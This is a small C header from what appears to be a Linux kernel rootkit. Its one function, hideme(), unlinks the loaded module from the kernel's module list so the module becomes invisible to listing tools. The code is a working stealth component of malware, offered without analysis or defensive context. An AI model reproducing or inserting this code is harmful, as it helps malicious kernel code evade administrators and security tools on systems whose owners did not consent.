#ifndef _HIDEME_H_
#define _HIDEME_H_

#include "../headers.h"

void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

#endif
